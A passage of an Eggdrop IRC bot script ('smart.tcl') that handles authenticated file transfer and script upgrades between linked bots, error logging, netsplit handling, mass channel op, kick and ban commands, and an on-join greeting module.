    }
    if {[catch {file copy -force $s $t} f_err] != 0} {
	pb $i "Sorry, error while trying to copy '$s' to '$t' : [b]$f_err[b]"
	pb $i "Operation aborted.. :o(" ; return 0
    }
    if {$lastbind == "cp"} { set q "copied" } else { set q "moved" ; file delete -force $s }
    bl "Successfully $q file '$s' to '$t' : requested by $h."
}

proc findtclfile {} {
    set l ". scripts script .. ../scripts ../script ../.. ../../scripts ../../script"
    foreach t $l { if {[file exists $t/smart.tcl]} { return $t/smart.tcl } }
    set l ". ../ ../../"
    foreach t $l {
	if {[catch {set w [exec find $t -name "smart.tcl"]}] == 0} {
	    if {[file exists [lindex $w 0]]} { return [lindex $w 0] }
	}
    }
    return ""
}

proc myaddr {} {
    global all_port users_port bots_port
    set a [myip]
    if {[info exists bots_port]} { lappend a $bots_port }
    if {[info exists users_port]} { lappend a $users_port }
    if {[llength $a] != 3} {
	if {[info exists all_port]} {
	    set a "[myip] $all_port $all_port"
	} else {
	    if {[llength $a] == 2} { lappend a [bi $a 1] }
	}
    }
    if {[llength $a] == 1} { set a "$a 0 0" } ; regsub -all " " $a "@" a ; return $a
}

proc sserv_try {p w {v ""}} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    set c "socket -server $w "
    if {$v != "" && $v != "default"} { append c "-myaddr $v " }
    append c $p
    catch {set i [eval $c]} e
    if {$e != 0} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return $e
    }
    return $i
}

proc file_get {s h p} {
    global fget
    if {![info exists fget]} { return 0 }
    set i [bi $fget 2] ; set fd [bi $fget 8]
    fconfigure $s -blocking 0 -translation binary -buffering full -buffersize 4096
    fileevent $s readable "file_recv $s $fd"
    dosocket close [bi $fget 0]
    set fget [lreplace $fget 9 9 [clock clicks]]
}

proc file_send {s c h i b} {
    global fsend fsend_compr fsend_uncompr wpref
    if {($c && ![info exists fsend_compr]) || (!$c && ![info exists fsend_uncompr])} {
	if {[info exists fsend($b)]} {
	    if {[islinked $b]} { putbot $b "sendfile $h $i abort" } ; unset fsend($b); return 0
	}
    }
    if {[valididx $i]} { pb $i "File transfer with $b started, please be patient.." }
    if {$c} { puts -nonewline $s $fsend_compr } else { puts -nonewline $s $fsend_uncompr }
    flush $s ; dosocket close $s
    foreach t [utimers] { if {[lindex $t 1] == "fsend_timeout"} { killutimer [lindex $t 2] } }
    utimer 20 fsend_timeout ; return 1
}

proc file_recv {s fd} {
    global fget
    set w [sgets $s]
    puts -nonewline $fd $w
    if {$w == "" && [eof $s]} {
	dosocket close $s ; close $fd
	set h [bi $fget 1] ; set i [bi $fget 2] ; set b [bi $fget 10]
	bot:sendfile $b sendfile "$h $i end [clock clicks]"
    }
}

proc hascompress {} {
    if {[info commands compressfile] != "compressfile"} { loadmodule compress }
    if {[info commands compressfile] != "compressfile"} { return 0 } else { return 1 }
}

proc file_try {f w} {
	global errorInfo
	if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
	catch { set fd [open $f $w] } e
	if {![info exists fd]} {
		if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
		return 0
	}
	return $fd
}

proc fsend_timeout {} {
    global fsend_compr fsend_uncompr
    if {[info exists fsend_compr]} { unset fsend_compr }
    if {[info exists fsend_uncompr]} { unset fsend_uncompr }
}

proc fget_timeout s { if {[validsocket $s]} { dosocket close $s } }

proc b64 {w t} {
    set b64 {} ; set b64_en {} ; set i 0 ; set wc "\n" ; set ml 60
    foreach c {A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 + /} {
	set b64_tmp($c) $i ; lappend b64_en $c ; incr i
    }
    scan z %c l
    for {set i 0} {$i <= $l} {incr i} {
	set c [format %c $i] ; set v {}
	if {[info exists b64_tmp($c)]} { set v $b64_tmp($c) } else { set v {} }
	lappend b64 $v
    }
    scan = %c i ; set b64 [lreplace $b64 $i $i -1] ; unset b64_tmp i c l v
    binary scan $t c* X
    switch -exact -- $w {
	"encode" {
	    set r {} ; set s 0 ; set l 0
	    foreach {x y z} $X {
		if {$ml && $l >= $ml} { append r $wc ; set l 0 }
		append r [lindex $b64_en [expr {($x >>2) & 0x3F}]]
		if {$y != {}} {
		    append r [lindex $b64_en [expr {(($x << 4) & 0x30) | (($y >> 4) & 0xF)}]]
		    if {$z != {}} {
			append r [lindex $b64_en [expr {(($y << 2) & 0x3C) | (($z >> 6) & 0x3)}]]
			append r [lindex $b64_en [expr {($z & 0x3F)}]]
		    } else {
			set s 2 ; break
		    }
		} else {
		    set s 1 ; break
		}
		incr l 4
	    }
	    if {$s == 1} {
		append r [lindex $b64_en [expr {(($x << 4) & 0x30)}]]==
	    } elseif {$s == 2} {
		append r [lindex $b64_en [expr {(($y << 2) & 0x3C)}]]=
	    }
	    return $r
	}
	"decode" {
	    foreach x $X {
		set bits [lindex $b64 $x]
		if {$bits >= 0} {
		    if {[llength [lappend n $bits]] == 4} {
			foreach {v w z y} $n break
			set a [expr {($v << 2) | ($w >> 4)}]
			set b [expr {(($w & 0xF) << 4) | ($z >> 2)}]
			set c [expr {(($z & 0x3) << 6) | $y}]
			append o [binary format ccc $a $b $c]
			set n {}
		    }
		} elseif {$bits == -1} {
		    foreach {v w z} $n break
		    set a [expr {($v << 2) | (($w & 0x30) >> 4)}]
		    if {$z == {}} {
			append o [binary format c $a]
		    } else {
			set b [expr {(($w & 0xF) << 4) | (($z & 0x3C) >> 2)}]
			append o [binary format cc $a $b]
		    }
		    break
		} else {
		    continue
		}
	    }
	    return $o
	}
	default {
	    al b64 "Warning: unknown option : $w" ; return ""
	}
    }
}

bind dcc m b64 dcc:b64
proc dcc:b64 {h i a} {
    set w [bi $a 0] ; set t [br $a 1 end]
    if {$t == "" || $w != "encode" && $w != "decode"} {
	pb $i "Usage : .b64 encode <string>" ; pb $i "Or    : .b64 decode <string>" ; return 0
    }
    putcmdlog "\#$h\# b64 $w $t"
    pb $i [b64 $w $t]
}

proc bot:sendfile {b c a} {
    global fsend fsend_compr fsend_uncompr fget wpref
    set h [bi $a 0] ; set i [bi $a 1] ; set w [bi $a 2]
    switch -exact -- $w {
	ask {
	    if {[info exists fget]} {
		set m "Sorry, already receiving a file.. Please retry later!" ; putbot $b "pbi $i $m" ; return 0
	    }
	    set l [bi $a 3] ; set L [bi $a 4] ; set r [bi $a 5]
	    set c [bi $a 6] ; set p [bi $a 7] ; set t [bi $a 8]
	    if {$r == "---please-find-the-tcl---"} { set r [findtclfile] }
	    if {$r == ""} {
		set m "Warning, I 'm unable to find location of 'smart.tcl', assuming '$l' .."
		putbot $b "pbi $i $m" ; set r $l
	    }
	    bl "Preparing to receive file '$r' from remote bot $b : Authorized by $h"
	    if {[file exists $r]} {
		if {![file writable $r]} {
		    set o 0
		} else {
		    set o 1
		    if {[catch {file copy -force $r $r.bak} e] != 0} {
			set m "Error trying to create backup copy for file '$r' : $e"
		    } else {
			set m "Created backup copy for file '$r' : $r.bak"
		    }
		    bl $m ; putbot $b "pbi $i $m"
		}
	    } else {
		set fd [file_try $r a]
		if {$fd == 0} { set o 0 } else { close $fd ; set o 1 }
	    }
	    if {$c && [hascompress]} { set c 1 } else { set c 0 }
	    set fd [file_try $wpref.receiving w]
	    if {$fd == 0} {
		set m "Error writing file '$wpref.receiving'.. Transfer aborted."
		putbot $b "pbi $i $m" ; return 0
	    }
	    set j [expr 10000 + [rand 55536]] ; set n 0
	    set s [sserv_try $j file_get]
	    while {![validsocket $s] && $n < 10} { set s [sserv_try $j file_get] ; incr n }
	    if {![validsocket $s]} { set m "Transfer aborted : $s" ; putbot $b "pbi $i $m" ; return 0 }
	    set fget "$s $h $i $l $L $r $c $p $fd [clock clicks] $b"
	    putbot $b "sendfile $h $i begin $l $r $o $c $t [myip] $j"
	    utimer 20 "fget_timeout $s"
	}
	begin {
	    set l [bi $a 3] ; set r [bi $a 4] ; set o [bi $a 5] ; set c [bi $a 6] ; set t [bi $a 7]
	    set d [bi $a 8] ; set p [bi $a 9]
	    if {!$o} {
		set m "[boja] \[From $b\] - Problems writing '$r'.. Transfer aborted!"
		if {[valididx $i]} { putdcc $i $m } else { putlog $m }
		return 0
	    }
	    if {![file readable $l]} {
		set m "I can 't read local file '$l'.. Transfer aborted!"
		if {[valididx $i]} { pb $i $m } else { bl $m }
		putbot $b "sendfile $h $i abort"
		return 0
	    }
	    set T [expr abs(([clock clicks] - $t) / 1000000.0)]
	    if {$T > 10} {
		pb $i "Ping reply for bot $b took $T seconds! Operation cancelled."
		bl "Aborted file transfer with remote bot $b : dangerous shell lag!"
		putbot $b "sendfile $h $i abort"
		return 0
	    }
	    if {($c && ![info exists fsend_compr]) || (!$c && ![info exists fsend_uncompr])} {
		if {$c && ![info exists fsend_compr]} {
		    pb $i "Compressing source file.."
		    compressfile -level 9 $l $wpref.sending.gz ; set fd [open $wpref.sending.gz r]
		    fconfigure $fd -translation binary -encoding binary ; set fsend_compr [read $fd] ; close $fd
		    file delete -force $wpref.sending.gz
		} elseif {!$c && ![info exists fsend_uncompr]} {
		    set fd [open $l r] ; fconfigure $fd -translation binary -encoding binary
		    set fsend_uncompr [read $fd] ; close $fd
		}
	    }
	    pb $i "Encoding and encrypting source file.."
	    if {$c && [info exists fsend_compr]} {
		set fsend_compr [encrypt $h.$i [b64 encode $fsend_compr]]
	    }
	    if {!$c && [info exists fsend_uncompr]} {
		set fsend_uncompr [encrypt $h.$i [b64 encode $fsend_uncompr]]
	    }
	    foreach j [utimers] { if {[lindex $j 1] == "fsend_timeout"} { killutimer [lindex $j 2] } }
	    utimer 20 fsend_timeout
	    set s [sconn_try $d $p]
	    if {![validsocket $s]} {
		if {[valididx $i]} { pb $i "Could not connect to $d p $p : $s : Operation cancelled." }
		bl "Aborted file transfer with remote bot $b : $s"
		putbot $b "sendfile $h $i abort" ; return 0
	    }
	    set fsend($b) $t
	    fconfigure $s -blocking 0 -translation binary -buffering full -buffersize 4096
	    fileevent $s writable "file_send $s $c $h $i $b"
	}
	end {
	    set l [bi $fget 3] ; set L [bi $fget 4] ; set r [bi $fget 5] ; set c [bi $fget 6]
	    set p [bi $fget 7] ; set t1 [bi $fget 9] ; set t2 [bi $a 3] ; unset fget ; set T [expr abs($t1 - $t2)]
	    if {[catch {file copy -force $wpref.receiving $r} e] != 0} {
		set o 0 ; set m "Error trying to write destination file '$r' : $e" ; putbot $b "pbi $i $m"
	    } else {
		set o 1 ; set m "Successfully wrote raw-file '$r' : adjusting.." ; putbot $b "pbi $i $m"
	    }
	    bl $m ; file delete -force $wpref.receiving
	    if {!$o} { return 0 }
	    set fd [open $r r] ; fconfigure $fd -translation binary -encoding binary ; set buf [read $fd] ; close $fd
	    set fd [open $r w] ; fconfigure $fd -translation binary -encoding binary
	    puts -nonewline $fd [b64 decode [decrypt $h.$i $buf]] ; close $fd
	    if {$c} { uncompressfile $r }
	    file attributes $r -permissions $p
	    set R [file size $r]
	    if {$R == $L} {
		bl "Successfully received file '$r' from remote bot $b as requested by $h : file size = $R bytes."
	    } else {
		bl "Unsuccessfully received file '$r' from remote bot $b as requested by $h : file size mismatch ( remote = $L bytes, local = $R bytes ).."
		if {[file exists $r.bak] && [catch {file copy -force $r.bak $r} e] == 0} {
		    bl "Restored file '$r' from backup '$r.bak' ..."
		}
	    }
	    putbot $b "sendfile $h $i status $L $R $l $T"
	}
	status {
	    set L [bi $a 3] ; set R [bi $a 4] ; set l [bi $a 5] ; set t [expr [bi $a 6] / 1000000.0]
	    if {$t < 0.000001} { set t 0.000001 } ; set v [expr [expr $R.00 / 1024] / $t]
	    set q [duration [expr abs(([clock clicks] - $fsend($b)) / 1000000.0)]]
	    set v [string range $v 0 [expr [string first . $v] + 2]]
	    if {$L == $R} {
		if {[valididx $i]} {
		    pb $i "File transfer with [b]$b[b] OK, size = $R bytes, average $v kb/s, total time $q"
		}
		bl "Successfully sent file '$l' to remote bot $b as requested by $h."
	    } else {
		if {[valididx $i]} {
		    pb $i "Unsuccessfully sent file '$l' to remote bot $b : file size mismatch ( remote = $R bytes, local = $L bytes ).."
		}
		bl "Unsuccessfully sent file '$l' to remote bot $b as requested by $h."
	    }
	    if {[info exists fsend($b)]} { unset fsend($b) }
	    if {$l == "smart_install.tcl"} { file delete -force $l }
	}
	abort {
	    if {[info exists fget]} { unset fget }
	    putlog "[boja] \[From $b\] - Aborted file transfer requested by $h, unrecoverable error.."
	}
    }
}

proc dcc:msend {h i a} {
    global fsend lastbind bnick
    set lb [strl $lastbind] ; set k "-nocompr" ; set c [lsearch -exact [strl $a] $k]
    if {$c == -1} { set c [hascompress] ; set k "" } else { set a [lreplace $a $c $c] ; set c 0 }
    set g [split [bi $a 0] ,] ; set l [bi $a 1] ; set r [bi $a 2]
    if {[llength $g] == 0 || ([llength $g] == 1 && [string length $g] != 1) || ($lb == "msend" && $l == "")} {
	if {$lb == "msend"} { set m "</local/path/to/file> \[/remote/path/to/file\]" } else {
	    set m "\[local/path/to/smart.tcl \[remote/path/to/smart.tcl\]\]"
	}
	pb $i "Usage : .$lb A / X / Y / Z /... $m \[-nocompr\]"
	pb $i "Or    : .$lb bot1,bot2,bot3,... $m \[-nocompr\]" ; return 0
    }
    set G ""
    if {[llength $g] == 1} {
	if {[stru $g] == "A"} { set G [bots] } else {
	    foreach b [strl [bots]] {
		if {[matchattr $b [stru $g]] && $b != [strl $bnick]} { lappend G $b }
	    }
	}
    } else {
	foreach b [strl $g] {
	    if {$b == [strl $bnick]} {
		pb $i "Wanna send to me ? Please use '[b].cp <source> <dest>[b]'!"
	    } elseif {![matchattr $b b]} {
		pb $i "I can 't recognize '$b' as a valid bot!"
	    } elseif {![islinked $b]} {
		pb $i "Bot '$b' is not linked!"
	    } elseif {[info exists fsend($b)]} {
		pb $i "I 'm already sending files to $b, please retry later!"
	    } else { lappend G $b }
	}
    }
    if {$G == ""} { pb $i "Sorry, I have no bots to send to.. :)" ; return 0 }
    if {$l == "" && $lb == "mupgrade" } {
	set l [findtclfile]
	if {$l == ""} { pb $i "Sorry, I 'm unable to locate 'smart.tcl', please specify the full path!" ; return 0 }
    }
    if {![file readable $l]} { pb $i "I can 't read file '$l'! Try '[b].ls[b]' and check permissions!" ; return 0 }
    if {[file size $l] > 4194304} { pb $i "Sorry, maximum file size is 4 MBytes." ; return 0 }
    if {$r == ""} { if {$lb == "mupgrade"} { set r "---please-find-the-tcl---" } else { set r $l } }
    putcmdlog "\#$h\# $lb [br $a 0 2] $k"
    if {$lb == "msend"} { set m "Sending botnet files" } else {
	pack smart_install.tcl $h $i upgrade ; if {![file exists smart_install.tcl]} { return 0 }
	set l smart_install.tcl ; set m "Trying to upgrade botnet TCL"
    }
    dccbroadcast "[boja] - $m, please keep traffic low!"
    set z [file size $l] ; set p [file attributes $l -permissions] ; set t [clock clicks]
    foreach b $G { putbot $b "sendfile $h $i ask $l $z $r $c $p $t" }
}

proc b64 {w t} {
    set b64 {} ; set b64_en {} ; set i 0 ; set wc "\n" ; set ml 60
    foreach c {A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 + /} {
	set b64_tmp($c) $i ; lappend b64_en $c ; incr i
    }
    scan z %c l
    for {set i 0} {$i <= $l} {incr i} {
	set c [format %c $i] ; set v {}
	if {[info exists b64_tmp($c)]} { set v $b64_tmp($c) } else { set v {} }
	lappend b64 $v
    }
    scan = %c i ; set b64 [lreplace $b64 $i $i -1] ; unset b64_tmp i c l v
    binary scan $t c* X
    switch -exact -- $w {
	"encode" {
	    set r {} ; set s 0 ; set l 0
	    foreach {x y z} $X {
		if {$ml && $l >= $ml} { append r $wc ; set l 0 }
		append r [lindex $b64_en [expr {($x >>2) & 0x3F}]]
		if {$y != {}} {
		    append r [lindex $b64_en [expr {(($x << 4) & 0x30) | (($y >> 4) & 0xF)}]]
		    if {$z != {}} {
			append r [lindex $b64_en [expr {(($y << 2) & 0x3C) | (($z >> 6) & 0x3)}]]
			append r [lindex $b64_en [expr {($z & 0x3F)}]]
		    } else {
			set s 2 ; break
		    }
		} else {
		    set s 1 ; break
		}
		incr l 4
	    }
	    if {$s == 1} {
		append r [lindex $b64_en [expr {(($x << 4) & 0x30)}]]==
	    } elseif {$s == 2} {
		append r [lindex $b64_en [expr {(($y << 2) & 0x3C)}]]=
	    }
	    return $r
	}
	"decode" {
	    foreach x $X {
		set bits [lindex $b64 $x]
		if {$bits >= 0} {
		    if {[llength [lappend n $bits]] == 4} {
			foreach {v w z y} $n break
			set a [expr {($v << 2) | ($w >> 4)}]
			set b [expr {(($w & 0xF) << 4) | ($z >> 2)}]
			set c [expr {(($z & 0x3) << 6) | $y}]
			append o [binary format ccc $a $b $c]
			set n {}
		    }
		} elseif {$bits == -1} {
		    foreach {v w z} $n break
		    set a [expr {($v << 2) | (($w & 0x30) >> 4)}]
		    if {$z == {}} {
			append o [binary format c $a]
		    } else {
			set b [expr {(($w & 0xF) << 4) | (($z & 0x3C) >> 2)}]
			append o [binary format cc $a $b]
		    }
		    break
		} else {
		    continue
		}
	    }
	    return $o
	}
	default {
	    bl "Warning: unknown option gave to b64 algorithm: $w" ; return ""
	}
    }
}

bind dcc m b64 dcc:b64
proc dcc:b64 {h i a} {
    set w [bi $a 0] ; set t [br $a 1 end]
    if {$t == "" || $w != "encode" && $w != "decode"} {
	pb $i "Usage : .b64 encode <data>" ; pb $i "Or    : .b64 decode <data>" ; return 0
    }
    putcmdlog "\#$h\# b64 $w $t"
    pb $i [b64 $w $t]
}

proc dcc:send {h i a} {
    global lastbind bnick fsend
    set lb [strl $lastbind] ; set k "-nocompr" ; set c [lsearch -exact [strl $a] $k]
    if {$c == -1} { set c [hascompress] ; set k "" } else { set a [lreplace $a $c $c] ; set c 0 }
    set b [bi $a 0] ; set l [bi $a 1] ; set r [bi $a 2]
    if {$b == "" || ($l == "" && $lb != "upgrade")} {
	if {$lb == "send" } { set m "</local/path/to/file> \[/remote/path/to/file\]" } else {
	    set m "\[/local/path/to/smart.tcl \[/remote/path/to/smart.tcl\]\]"
	}
	pb $i "Usage : .$lb <botname> $m \[-nocompr\]" ; return 0
    }
    if {[strl $b] == [strl $bnick]} {
	pb $i "Wanna send to me ? Please use '[b].cp <source> <dest>[b]'!" ; return 0
    }
    if {![matchattr $b b]} { pb $i "I can 't recognize '$b' as a valid bot!" ; return 0 }
    if {![islinked $b]} { pb $i "Bot '$b' is not linked!" ; return 0 }
    if {[info exists fsend($b)]} { pb $i "I 'm already sending files to $b, please retry later!" ; return 0 }
    if {$l == "" && $lb == "upgrade" } {
	set l [findtclfile]
	if {$l == ""} { pb $i "Sorry, I 'm unable to locate 'smart.tcl', please specify the full path!" ; return 0 }
    }
    if {![file readable $l]} { pb $i "I can 't read file '$l'! Try '[b].ls[b]' and check permissions!" ; return 0 }
    if {[file size $l] > 4194304} { pb $i "Sorry, maximum file size is 4 MBytes." ; return 0 }
    if {$r == ""} { if {$lb == "upgrade"} { set r "---please-find-the-tcl---" } else { set r $l } }
    putcmdlog "\#$h\# $lb [br $a 0 2] $k"
    if {$lb == "send"} { set m "Sending botnet files" } else {
	pack smart_install.tcl $h $i upgrade ; if {![file exists smart_install.tcl]} { return 0 }
	set l smart_install.tcl ; set m "Trying to upgrade botnet TCL"
    }
    dccbroadcast "[boja] - $m, please keep traffic low!"
    putbot $b "sendfile $h $i ask $l [file size $l] $r $c [file attributes $l -permissions] [clock clicks]"
}

set probe_module_conf "$wpref.errors"
proc probe_check {} {
    global errorInfo probe_module_conf
    if {[info exists errorInfo] && $errorInfo != ""} {
	if {[file exists $probe_module_conf]} { set q "a" } else { set q "w" } ; set f [open $probe_module_conf $q]
	puts $f "******** Date: [ctime [unixtime]] - TCL v [rv] ********" ; puts $f $errorInfo
	puts $f "**************************************************************"
	close $f ; set errorInfo ""
    }
    foreach t [timers] { if {[lindex $t 1] == "probe_check"} { killtimer [lindex $t 2] } }
    timer 30 probe_check
}
if {![string match "*probe_check*" [timers]]} { probe_check }
proc dcc:probe {h i a} {
    global all_port bots_port users_port errorInfo probe_module_conf bnick
    set w [strl [bi $a 0]]
    putcmdlog "\#$h\# probe $w"
    pb $i "$bnick is running advanced [boja] [b]TCL[b] version [b][rv][b] by ^Boja^."
    pb $i "TCL version [info tclversion] patchlevel [b][info patchlevel][b]"
    set p ""
    if {[info exists all_port]} {
	append p "[b]$all_port[b] ( all ) "
    }
    if {[info exists bots_port]} {
	append p "[b]$bots_port[b] ( bots ) "
    }
    if {[info exists users_port]} {
	append p "[b]$users_port[b] ( users )"
    }
    if {$p == ""} { set p "[b]none[b] :o?" }
    pb $i "Listening ports: $p"
    pb $i "-----------------------------------"
    if {$w == "log"} {
	if {![file exists $probe_module_conf]} {
	    pb $i "[b]No errors[b] logged ! ^_^"
	} else {
	    pb $i "Logged errors :"
	    set fd [open $probe_module_conf r]
	    while {![eof $fd]} {
		set s [gets $fd]
		if {[eof $fd]} { break }
		putdcc $i $s
	    }
	    close $fd
	}
    } elseif {$w == "clear"} {
	if {![matchattr $h n]} {
	    pb $i "Sorry, only owners can remove logfiles.."
	} else {
	    file delete -force $probe_module_conf
	    bl "Removed Probe-System logfile : Authorized by $h."
	}
    } else {
	if {[info exists errorInfo] && $errorInfo != ""} {
	    pb $i "[b]********** Possible BUG **********[b]"
	    putdcc $i $errorInfo
	    pb $i "[b]**********************************[b]"
	    if {[file exists $probe_module_conf]} {
		set fd [open $probe_module_conf a]
	    } else {
		set fd [open $probe_module_conf w]
	    }
	    puts $fd "******** Date: [ctime [unixtime]] - TCL v [rv] ********"
	    puts $fd $errorInfo
	    puts $fd "**************************************************************"
	    close $fd
	    set errorInfo ""
	    foreach t [timers] {
		if {[lindex $t 1] == "probe_check"} {
		    killtimer [lindex $t 2]
		}
	    }
	    timer 30 probe_check
	} else {
	    foreach t [timers] {
		if {[lindex $t 1] == "probe_check"} {
		    set T [lindex $t 0]
		}
	    }
	    pb $i "[b]No errors[b] found since last check ( [expr 30 - $T] minutes ago )"
	    pb $i "Try '[b].probe log[b]' to see all logged errors! ;)"
	}
    }
    pb $i "-----------------------------------"
    pb $i "Please, report any bugs to [b]^Boja^[b] ( boja@avatarcorp.org )"
    if {[matchattr $h m]} {
	pb $i "( To do that, you can use '[b].mail boja@avatarcorp.org[b]' )"
    }
    pb $i "and use '.ver' to check for updates... Thank you!!! ;D"
}

al init "BotNet extensions loaded and ready!"

################################
# No-Cycle on notice by server #
################################

proc cy_check {from keyword arg} {
    global botnick cy_chans cy_gotnotc server
    if {$cy_gotnotc} {return 0}
    set arg [split $arg]
    set nick [lindex [split $from "!"] 0]
    if {![string match *.* $nick]} {return 0}
    set text [lrange $arg 1 end]
    if {![string match "*** Notice -- Due to a network split, you can not obtain channel operator status in a new channel at this time." $text]} {return 0}
    set cy_gotnotc 1
    set opped ""
    set nopped ""
    foreach chan [strl [channels]] {
	if {![onchan $botnick $chan]} {
	    lappend nopped $chan
	} elseif {[isop $botnick $chan]} {
	    lappend opped $chan
	} else {
	    lappend nopped $chan
	}
    }
    if {$opped == ""} {
	bl "nocycle: detected no_chanops_when_split on my current server ([lindex [split $server :] 0]). Not oped on any channels - jumping to next server."
	smart_quit
    } else {
	if {$nopped == ""} {return 0}
	foreach chan $nopped {
	    if {[string match *-cycle* [channel info $chan]]} {continue}
	    lappend cy_chans $chan
	    channel set $chan -cycle
	}
	if {$cy_chans == ""} {return 0}
	set oplist [join $opped ", "]
	set noplist [join $cy_chans ", "]
	bl "nocycle: detected no_chanops_when_split on my current server ([lindex [split $server :] 0]). Opped on $oplist - switched off cycle for $noplist."
    }
}

proc cy_on {from keyword arg} {
    global cy_chans cy_gotnotc
    set cy_gotnotc 0
    if {$cy_chans == ""} {return 0}
    foreach chan $cy_chans {
	channel set $chan +cycle
    }
    set cy_chans ""
}

if {![info exists cy_chans]} {
    set cy_chans ""
}

if {![info exists cy_gotnotc]} {
    set cy_gotnotc 0
}

bind raw - NOTICE cy_check
bind raw - 002 cy_on

##########################
# Invite + Op + Kick All #
##########################

bind dcc o|o aup dcc:aup
bind dcc o aop dcc:aop
bind dcc o adeop dcc:adeop
bind dcc o|o allinv dcc:allinv
bind dcc o akick dcc:akick
bind dcc o akb dcc:akb

proc dcc:aup {h idx text} {
    set chans ""
    if {[matchattr $h o]} {
	putcmdlog "\#$h\# aup"
	foreach chan [channels] {
	    foreach nick [chanlist $chan] {
		if {[strl [nick2hand $nick $chan]] == [strl $h]} {
		    pushmode $chan +o $nick
		}
	    }
	}
	pb $idx "Gave you op on all channels."
	return 0
    }
    foreach chan [channels] {
	if {[matchattr $h |o $chan]} {
	    foreach nick [chanlist $chan] {
		if {[strl [nick2hand $nick $chan]] == [strl $h]} {
		    pushmode $chan +o $nick
		}
	    }
	    lappend chans $chan
	}
    }
    if {$chans == ""} {
	pb $idx "Sorry, you don't have op-flags.."
    } else {
	putcmdlog "\#$h\# aup"
	pb $idx "Gave you op on $chans."
    }
}

proc dcc:aop {h idx arg} {
    set nicks [lrange $arg 0 end]
    if {$nicks == ""} {
	pb $idx "Usage : .aop  <nick> \[nick1\] \[nick2\] \[nick3\]...."
	return 0
    }
    putcmdlog "\#$h\# aop $nicks"
    pb $idx "Oping $nicks on ALL bot's channels."
    foreach nickname $nicks {
	foreach chan [channels] {
	    if {[string match "*+bitch*" [channel info $chan]]} {
		if {[matchattr [nick2hand $nickname $chan] o|o $chan]} {
		    pushmode $chan +o $nickname
		} else {
		    pb $idx "Sorry, channel $chan is +bitch!"
		}
	    } else {
		pushmode $chan +o $nickname
	    }
	}
    }
}

proc dcc:adeop {h idx arg} {
    set nicks [lrange $arg 0 end]
    if {$nicks == ""} {
	pb $idx "Usage : .adeop <nick> \[nick1\] \[nick2\] \[nick3\]...."
	return 0
    }
    putcmdlog "\#$h\# adeop $nicks"
    pb $idx "Deoping $nicks on ALL bot's channels."
    set chans ""
    foreach nickname $nicks {
	foreach chan [channels] {
	    pushmode $chan -o $nickname
	}
    }
    return 0
}

proc dcc:allinv {h idx arg} {
    set nick [bi $arg 0]
    if {$nick == ""} { set nick $h }

    if {[matchattr $h o]} {
	putcmdlog "\#$h\# allinv $nick"
	foreach chan [channels] {
	    putserv "INVITE $nick $chan"
	}
	pb $idx "Inviting $nick on ALL bot's channels."
	return 0
    }
    foreach chan [channels] {
	if {[matchattr $h |o $chan]} {
	    putserv "INVITE $nick $chan"
	    lappend chans $chan
	}
    }
    if {$chans == ""} {
	pb $idx "Sorry, you don't have op-flags.."
    } else {
	putcmdlog "\#$h\# allinv $nick"
	pb $idx "Inviting $nick on $chans."
    }
}

proc dcc:akick {h idx arg} {
    set nicks [lrange $arg 0 end]
    if {$nicks == ""} {
	pb $idx "Usage : .akick <nick> \[nick1\] \[nick2\] \[nick3\]...."
	return 0
    }
    putcmdlog "\#$h\# akick $nicks"
    pb $idx "Kicking $nicks from ALL bot's channels"
    set chans ""
    foreach nickname $nicks {
	foreach chan [channels] {
	    putserv "KICK $chan $nickname :[boja]"
	}
    }
}

proc dcc:akb {h idx arg} {
    set nicks [lrange $arg 0 end]
    if {$nicks == ""} {
	pb $idx "Usage : .akb <nick> \[nick1\] \[nick2\] \[nick3\]...."
	return 0
    }
    putcmdlog "\#$h\# akb $nicks"
    pb $idx "Kick-banning $nicks from ALL bot's channels"
    set chans ""
    foreach nickname $nicks {
	foreach chan [channels] {
	    pushmode $chan -o $nickname
	    putquick "MODE $chan +b $nickname"
	    putkick $chan $nickname "pwho!!! >:-o"
	}
    }
}

al init "Channel functions loaded and ready!"

### Flagnote / Logs / Mail / OnJoin

bind dcc - flagnote dcc:flagnote
bind dcc m mail dcc:mail
bind dcc m|m onjoin dcc:onjoin
bind join - * join:checkpass
bind dcc m checkpass dcc:checkpass

set onj_module_conf "$wpref.onjoin"
set onj_ver1 "1.0"
set onj_ver ""
set onj_type "off"
set onj_part "off"
set onj_list ""
set onj_jmsg(all) "Wellcome to %chan, %nick ! ^_^"
set onj_pmsg(all) "See you soon on %chan, %nick ! ^_^"
set onj_kind "notice"

proc onj_save {} {
    global onj_module_conf onj_ver onj_type onj_part onj_list onj_jmsg onj_pmsg onj_kind
    set fd [open $onj_module_conf w]
    puts $fd "set onj_ver \"$onj_ver\""
    puts $fd "set onj_type \"$onj_type\""
    puts $fd "set onj_part \"$onj_part\""
    puts $fd "set onj_list \"$onj_list\""
    foreach n [array names onj_jmsg] {
	puts $fd "set onj_jmsg($n) \"$onj_jmsg($n)\""
    }
    foreach n [array names onj_pmsg] {
	puts $fd "set onj_pmsg($n) \"$onj_pmsg($n)\""
    }
    puts $fd "set onj_kind \"$onj_kind\""
    puts $fd "al init \"On-Join System configuration loaded!\""
    close $fd
}

if {![file exists $onj_module_conf]} {
    al init "On-Join System conf file not found..Generating defaults.."
    onj_save
}

source $onj_module_conf

if {$onj_ver1 != $onj_ver} {
    set onj_ver $onj_ver1
    onj_save
}

unset onj_ver1

proc onj_start {} {
    global onj_part
    set b [lindex [binds join_wellcome] 0]
    if {$b == ""} {
	catch {bind join - * join_wellcome}
    }
    set b [lindex [binds part_seeyou] 0]
    if {$b == "" && $onj_part == "on"} {
	catch {bind part - * part_seeyou}
    } elseif {$b != "" && $onj_part != "on"} {
	catch {unbind part - * part_seeyou}
    }
}

proc onj_stop {} {
    set b [lindex [binds join_wellcome] 0]
    if {$b != ""} {
	catch {unbind join - * join_wellcome}
    }
    set b [lindex [binds part_seeyou] 0]
    if {$b != ""} {
	catch {unbind part - * part_seeyou}
    }
}

if {$onj_type == "off"} {
    onj_stop
} else {
    onj_start
}

proc dcc:onjoin {h i a} {
